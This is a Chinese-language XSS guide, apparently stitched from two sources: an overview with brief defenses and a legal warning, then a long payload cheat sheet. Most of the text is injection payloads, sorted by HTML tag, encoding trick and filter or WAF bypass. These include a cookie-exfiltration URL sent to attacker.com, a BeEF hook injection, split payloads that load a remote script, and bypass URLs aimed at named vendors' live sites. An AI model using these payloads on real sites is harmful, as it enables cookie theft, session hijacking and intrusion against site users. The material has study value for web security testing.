```markdown
# XSS漏洞应用指南（2025年深度版）

---

## 一、XSS漏洞核心原理与分类
### 1.1 漏洞原理
XSS（跨站脚本攻击）通过向网页注入恶意脚本（如JavaScript），利用未过滤的用户输入在受害者浏览器中执行非预期代码。其核心逻辑是：**用户输入数据被直接拼接至HTML/JS中，且未经过验证或转义**。例如：
```html
<!-- 用户输入被直接输出 -->
<div>用户评论：${userInput}</div>
```
当`userInput`为`<script>alert(document.cookie)</script>`时，即可触发Cookie窃取。

### 1.2 三大基础类型
| 类型       | 触发条件                            | 持久性 | 典型场景           | 危害等级 |
| ---------- | ----------------------------------- | ------ | ------------------ | -------- |
| **反射型** | 恶意脚本通过URL参数反射回页面       | 非持久 | 搜索框、错误提示页 | 中       |
| **存储型** | 恶意脚本存储于服务器（数据库/文件） | 持久   | 评论区、用户资料页 | 高危     |
| **DOM型**  | 客户端JS直接操作DOM时未过滤输入     | 非持久 | 前端动态渲染页面   | 中       |

**案例演示**：
- **反射型**：构造URL `http://example.com/search?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script>`，诱导用户点击。
- **存储型**：在论坛评论区提交`<img src=x onerror=stealCookies()>`，所有访问者触发。

---

## 二、高级攻击场景与利用技术
### 2.1 非传统媒介注入
#### (1) **SVG-XSS**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```
SVG文件上传后，浏览器解析时触发脚本执行（需允许上传SVG格式）。

#### (2) **PDF-XSS**
通过PDF编辑器插入JavaScript动作：
```javascript
app.alert({cMsg: "XSS Triggered", cTitle: "Exploit"});
```
用户使用浏览器打开PDF时触发。

#### (3) **Flash-XSS**
```actionscript
getURL("javascript:alert(document.domain)");
```
结合SWF文件上传漏洞，实现跨域攻击（需Flash插件支持）。

### 2.2 自动化工具链
#### (1) **BeEF框架**
```bash
# 启动BeEF控制端
docker run -p 3000:3000 janes/beef
```
注入代码：
```html
<script src="http://beef-server:3000/hook.js"></script>
```
**攻击能力**：
- 键盘记录
- 浏览器指纹收集
- 内网渗透
- 社交工程钓鱼

#### (2) **XSS平台搭建**
使用开源平台（如[XSS Hunter](https://xss-hunter.com/)）自动收集Cookie、页面截图等数据。

---

## 三、漏洞挖掘与绕过技巧
### 3.1 基础检测方法
```javascript
'"><svg/onload=prompt(1)> 
```
通过注入特殊字符测试过滤规则，观察是否弹窗或HTML结构变化。

### 3.2 WAF绕过技术
| 绕过类型     | 示例                                          | 原理                       |
| ------------ | --------------------------------------------- | -------------------------- |
| **字符分割** | `jav&#x61;script:alert(1)`                    | 十六进制编码绕过关键词检测 |
| **属性混淆** | `<img/src=x onerror=alert(1)>`                | 省略引号与空格             |
| **CSS注入**  | `<div style="x:expression(alert(1))">`        | 利用CSS表达式执行JS        |
| **事件复用** | `<svg onload=location='javascript:alert(1)'>` | 动态构造执行环境           |

**实战案例**：
```html
<iframe srcdoc="<script>alert(parent.document.cookie)</script>"></iframe>
```
通过`srcdoc`属性绕过传统XSS过滤器。

---

## 四、防御体系构建
### 4.1 开发层防护
#### (1) **输入验证**
```javascript
// 白名单过滤（仅允许字母、数字）
function sanitize(input) {
  return input.replace(/[^a-zA-Z0-9]/g, '');
}
```

#### (2) **输出编码**
| 输出场景   | 编码方法              | 工具函数示例（Node.js）              |
| ---------- | --------------------- | ------------------------------------ |
| HTML正文   | HTML实体编码          | `const safe = escapeHtml(userInput)` |
| HTML属性   | 引号转义+十六进制编码 | `value.replace(/"/g, '&quot;')`      |
| JavaScript | Unicode转义           | `JSON.stringify(userInput)`          |

#### (3) **CSP策略**
```http
Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'
```
通过随机数（nonce）限制脚本执行来源。

### 4.2 运维层加固
- **Cookie防护**：设置`HttpOnly`和`SameSite=Strict`属性
- **文件上传**：限制文件类型、检测文件魔数
- **日志监控**：实时告警异常请求（如包含`<script>`的URL参数）

---

## 五、法律与伦理边界
根据《网络安全法》第二十七条，未经授权的渗透测试属于违法行为。所有测试需满足：
1. 获得目标系统的书面授权
2. 测试数据加密存储，完成后立即销毁
3. 禁止使用`--os-shell`等高风险操作生产环境

> 本指南仅用于授权测试场景，恶意利用将承担刑事责任。技术发展日新月异，请持续关注OWASP等权威机构的最新防御建议。

---

### 扩展阅读
- [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) - 最新绕过技巧
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) - 策略有效性检测工具
- [Web安全攻防实战](https://github.com/OWASP/CheatSheetSeries) - OWASP官方知识库

```
```

### 0x01. <a> 标签

```
<a href="javascript:alert(1)">test</a>
<a href="x" onfocus="alert('xss');" autofocus="">xss</a>
<a href="x" onclick=eval("alert('xss');")>xss</a>
<a href="x" onmouseover="alert('xss');">xss</a>
<a href="x" onmouseout="alert('xss');">xss</a>
```

### 0x02. <img>标签

```
<img src=x onerror="alert(1)">
<img src=x onerror=eval("alert(1)")>
<img src=1 onmouseover="alert('xss');">
<img src=1 onmouseout="alert('xss');">
<img src=1 onclick="alert('xss');">
```

### 0x03. <iframe>标签

```
<iframe src="javascript:alert(1)">test</iframe>
<iframe onload="alert(document.cookie)"></iframe>
<iframe onload="alert('xss');"></iframe>
<iframe onload="base64,YWxlcnQoJ3hzcycpOw=="></iframe>
<iframe onmouseover="alert('xss');"></iframe>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

### 0x04. <audio> 标签

```
<audio src=1 onerror=alert(1)>
<audio><source src="x" onerror="alert('xss');"></audio>
<audio controls onfocus=eval("alert('xss');") autofocus=""></audio>
<audio controls onmouseover="alert('xss');"><source src="x"></audio>

```

### 0x05. <video>标签

```
<video src=x onerror=alert(1)>
<video><source onerror="alert('xss');"></video>
<video controls onmouseover="alert('xss');"></video>
<video controls onfocus="alert('xss');" autofocus=""></video>
<video controls onclick="alert('xss');"></video>
```

### 0x06. <svg> 标签

```
<svg onload=javascript:alert(1)>
<svg onload="alert('xss');"></svg>
```

### 0x07. <button> 标签

```
<button onclick=alert(1)>
<button onfocus="alert('xss');" autofocus="">xss</button>
<button onclick="alert('xss');">xss</button>
<button onmouseover="alert('xss');">xss</button>
<button onmouseout="alert('xss');">xss</button>
<button onmouseup="alert('xss');">xss</button>
<button onmousedown="alert('xss');"></button>
```

### 0x08. <div>标签

这个需要借助url编码来实现绕过

```
原代码：
<div onmouseover='alert(1)'>DIV</div>
经过url编码：
<div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV<%2fdiv>
```

### 0x09. <object>标签

这个需要借助 data 伪协议和 base64 编码来实现绕过

```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
```

### 0x10. <script> 标签

```
<script>alert('xss')</script>
<script>alert(/xss/)</script>
<script>alert(123)</script>
```

### 0x11. <p> 标签

```
<p onclick="alert('xss');">xss</p>
<p onmouseover="alert('xss');">xss</p>
<p onmouseout="alert('xss');">xss</p>
<p onmouseup="alert('xss');">xss</p>
```

### 0x12. <input> 标签

```
<input onclick="alert('xss');">
<input onfocus="alert('xss');">
<input onfocus="alert('xss');" autofocus="">
<input onmouseover="alert('xss');">
<input type="text" onkeydown="alert('xss');"></input>
<input type="text" onkeypress="alert('xss');"></input>
<input type="text" onkeydown="alert('xss');"></input>
```

### 0x13. <details>标签

```
<details ontoggle="alert('xss');"></details>
<details ontoggle="alert('xss');" open=""></details>
```

### 0x14. <select> 标签

```
<select onfocus="alert('xss');" autofocus></select>
<select onmouseover="alert('xss');"></select>
<select onclick=eval("alert('xss');")></select>
```

### 0x15. <form> 标签

### <form method="x" action="x" onmouseover="alert('xss');"><input type=submit></form> <form method="x" action="x" onmouseout="alert('xss');"><input type=submit></form> <form method="x" action="x" onmouseup="alert('xss');"><input type=submit></form>

### 0x16. <body> 标签

```
<body onload="alert('xss');"></body>
```



## 二、xss 常见绕过

## 编码绕过

浏览器对 XSS 代码的解析顺序为：**HTML解码 —— URL解码 —— JS解码(只支持UNICODE)**。

### 0x01. html 实体编码

**当可控点为单个标签属性时，可以使用 html 实体编码。**

```
<a href="可控点">test</a>

<iframe src="可控点">test<iframe>
<img src=x onerror="可控点">
```

**Payload**

```
<a href="javascript:alert(1)">test</a>
```

**十进制**

```
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">test</a>
```

**十六进制**

```
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">test</a>
```

**可以不带分号**

```
<a href="&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29">test</a>
```

**可以填充0**

```
<a href="&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0031&#x0029">test</a>
```

### 0x02. url 编码

**当注入点存在 href 或者 src 属性时，可以使用 url 编码。**

```
<a href="可控点">test</a>

<iframe src="可控点">test</iframe>
```

**Payload**

```
<a href="javascript:alert(1)">test</a>

<iframe src="javascript:alert(1)">test</iframe>
```

**注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。**

```
<a href="javascript:%61%6c%65%72%74%28%31%29">test</a>

<iframe src="javascript:%61%6c%65%72%74%28%31%29">test</iframe>
```

**可以二次编码**

```
<a href="javascript:%2561%256c%2565%2572%2574%2528%2531%2529">test</a>

<iframe src="javascript:%2561%256c%2565%2572%2574%2528%2531%2529">test</iframe>
```

### 0x03. js 编码

**解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，例如 js 解析器工作的时候将`\u0061\u006c\u0065\u0072\u0074`进行解码后为`alert`，而`alert`是一个有效的标识符名称，它是能被正常解析的。但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。**

**由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。**

**js 编码策略：**

1. "\" 加上三个八进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\074"
2. "\x" 加上两个十六进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\x3c"
3. "\u" 加上四个十六进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\u003c"
4. 对于一些控制字符，使用特殊的 C 类型的转义风格（例如 \n 和 \r）

```
<img src=x onerror="可控点">

<input onfocus=location="可控点" autofocus> 
```

**Payload**

```
<img src=x onerror="alert(1)">

<input onfocus=location="alert(1)" autofocus> 
```

**Unicode 编码**

```
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<input onfocus=location="javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029" autofocus> 
```

**注：**

**Unicode 编码时，只能对有效的标识符进行编码，否则非标识符解码后不能解析执行。例如 javascript:alert(1) ，进行 Unicode 编码时，只能对 alert 和 "1" 进行编码，框号编码后会被当成文本字符，不能执行。****ascii 八进制和十六进制编码使用时需要 eval、setTimeout等函数传递变量，并且可以对整个传递参数进行编码。例如 eval("alert(1)")，可以对 "alert(1)" 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。**

**八进制和十六进制**

setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。

语法：`setTimeout(要执行的代码, 等待的毫秒数)`

```
setTimeout(JavaScript 函数, 等待的毫秒数)
1.<svg/onload=setTimeout('\x61\x6C\x65\x72\x74\x28\x31\x29')>
2.<svg/onload=setTimeout('\141\154\145\162\164\050\061\051')>
3.<svg/onload=setTimeout('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')>
4.<script>eval("\x61\x6C\x65\x72\x74\x28\x31\x29")</script>
5.<script>eval("\141\154\145\162\164\050\061\051")</script>
6.<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
```

### 0x04. 混合编码

```
<a href="可控点">test</a>
```

**Payload**

```
<a href="javascript:alert(1)">test</a>
```

**html 编码**

```
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">test</a>
```

**Unicode 编码**

```
<a href="javascript:\u0061\u006c\u0065\u0072\u0074(1)">test</a>
```

**注：Unicode 编码不能对括号使用**

**url 编码**

```
<a href="javascript:%61%6c%65%72%74%28%31%29">test</a>
```

**由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。**

```
1. 原代码
<a href="javascript:alert(1)">test</a>
2. 对alert进行JS编码（unicode编码）
<a href="javascript:\u0061\u006c\u0065\u0072\u0074(1)">test</a>
3. 对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码
<a href="javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)">test</a>
4. 对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)进行HTML编码：
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;&#x29;">test</a>
```

**注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。**

### 0x05. base64 编码

**base64 编码通常需要使用到 data 伪协议。**

**data 协议使用方法：`data:资源类型;编码,内容`**

base64编码内容为

```
<script>alert(/xss/)</script>
PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=
```

通常与 base64 编码配合 data 协议的标签有 **<object>、<a>、<iframe>**

```
1.<object> 标签
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
2.<a> 标签
<a href="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=">test</a>   （新版浏览器不支持）
3.<iframe> 标签
<iframe src="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></iframe>
4.<embed> 标签
<embed src="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></embed>
```

**atob 函数**

atob() 方法用于解码使用 base-64 编码的字符串。

语法：`window.atob(encodedStr)`(encodedStr: 必需，是一个通过 btoa() 方法编码的字符串)

```
1.<a href=javascript:eval(atob('YWxlcnQoMSk='))>test</a>
2.<a href=javascript:eval(window.atob('YWxlcnQoMSk='))>test</a>
3.<a href=javascript:eval(window['atob']('YWxlcnQoMSk='))>test</a>
4.<img src=x onmouseover="eval(window.atob('YWxlcnQoMSk='))">
5.<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
6.<iframe src="javascript:eval(window['atob']('YWxlcnQoMSk='))"></iframe>
```

### 0x06. ascii 编码

ascii 编码一般配合`String.fromCharCode`使用。

```
alert(1)
十进制：97, 108, 101, 114, 116, 40, 49, 41
十六进制：0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29
```

**十进制**

```
<a href='javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))'>test</a>
```

**十六进制**

```
<a href='javascript:eval(String.fromCharCode(0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29))'>test</a>
```



## 空格过滤绕过

<html><img**AA**src**AA**onerror**BB**=**BB**alert**CC**(1)**DD**</html>

A位置可填充 /，/123/，%09，%0A，%0C，%0D，%20 B位置可填充 %09，%0A，%0C，%0D，%20 C位置可填充 %0B，/**/，如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20 D位置可填充 %09，%0A，%0C，%0D，%20，//，>



## 圆括号过滤绕过

### 0x01. 反引号替换

```
<script>alert`1`</script>
```

### 0x02. throw 绕过

```
<video src onerror="javascript:window.onerror=alert;throw 1">
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```



## 单引号过滤绕过

### 0x01. 斜杠替换

```
<script>alert(/xss/)</script>
```

### 0x02. 反引号替换

```
<script>alert(`xss`)</script>
```



## alert 过滤绕过

### 0x01. prompt 替换

```
<script>prompt(/xss/)</script>
```

### 0x02. confirm 替换

```
<script>confirm(/xss/)</script>
```

### 0x03. console.log 替换

```
<script>console.log(3)</script>
```

### 0x04. document.write 替换

```
<script>document.write(1)</script>
```

### 0x05. base64 绕过

```
<img src=x onerror="Function`a${atob`YWxlcnQoMSk=`}```">
<img src=x onerror="``.constructor.constructor`a${atob`YWxlcnQoMSk=`}```">
```



## 关键词置空绕过

### 0x01. 大小写绕过

```
<script>alert(/xss/)</script>
```

可以转换为

```
<ScRiPt>AlErT(/xss/)</sCrIpT>
```

### 0x02. 嵌套绕过

嵌套<script>和</script>突破

```
<script>alert(/xss/)</script>
```

可以转换为

```
<sc<script>ript>alert(/xss/)</sc</script>ript>
```



## 函数拼接

### 0x01. eval

```
<img src="x" onerror="eval('al'+'ert(1)')">
```

### 0x02. top

```
<img src="x" onerror="top['al'+'ert'](1)">
```

### 0x03. window

```
<img src="x" onerror="window['al'+'ert'](1)">
```

### 0x04. self

```
<img src="x" onerror="self[`al`+`ert`](1)">
```

### 0x05. parent

```
<img src="x" onerror="parent[`al`+`ert`](1)">
```

### 0x06. frames

```
<img src="x" onerror="frames[`al`+`ert`](1)">
```

### 0x07. 常用函数

```
<img src="x" onerror="eval(alert(1))">
<img src="x" onerror="open(alert(1))">
<img src="x" onerror="document.write(alert(1))">
<img src="x" onerror="setTimeout(alert(1))">
<img src="x" onerror="setInterval(alert(1))">
<img src="x" onerror="Set.constructor(alert(1))">
<img src="x" onerror="Map.constructor(alert(1))">
<img src="x" onerror="Array.constructor(alert(1))">
<img src="x" onerror="WeakSet.constructor(alert(1))">
<img src="x" onerror="constructor.constructor(alert(1))">
<img src="x" onerror="[1].map(alert(1))">
<img src="x" onerror="[1].find(alert(1))">
<img src="x" onerror="[1].every(alert(1))">
<img src="x" onerror="[1].filter(alert(1))">
<img src="x" onerror="[1].forEach(alert(1))">
<img src="x" onerror="[1].findIndex(alert(1))">
```



## 赋值拼接

```
<img src onerror=_=alert,_(1)>
<img src x=al y=ert onerror=top[x+y](1)>
<img src onerror=top[a='al',b='ev',b+a]('alert(1)')>
<img src onerror=['ale'+'rt'].map(top['ev'+'al'])[0]['valu'+'eOf']()(1)>
```



## 火狐IE专属

```
<marquee onstart=alert(1)>
```



## 拆分法

当 Web 应用程序对目标用户的输入长度进行了限制时，这时无法注入较长的xss攻击向量，但是特定情况下，这种限制可以通过拆分法注入的方式进行绕过。

```
<script>a='document.write("'</script>
<script>a=a+'<script src=ht'</script>
<script>a=a+'tp://test.com/xs'</script>
<script>a=a+'s.js></script>")'</script>
<script>eval(a)</script>
```

通过上面的拆分法可以拼凑出下面完整的攻击向量：

```
document.write("<script src = http://test.com/xss.js></script>")
```



# 三、绕过 waf 拦截

### 安全狗

```
http://www.safedog.cn/index/privateSolutionIndex.html?tab=2<video/src/onerror=top[`al`%2B`ert`](1);>
http://www.safedog.cn/index/privateSolutionIndex.html?tab=2<video/src/onerror=appendChild(createElement("script")).src="//z.cn">
```

### D盾

```
http://www.d99net.net/News.asp?id=126<video/src/onloadstart=top[`al`%2B`ert`](1);>
http://www.d99net.net/News.asp?id=126<video/src/onloadstart=top[a='al',b='ev',b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);>
```

### 云锁+奇安信 waf

```
http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1<video/src/onloadstart=top[`al`%2B`ert`](1);>
http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1<video/src/onloadstart=top[a='al',b='ev',b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);>
```





参考文章：

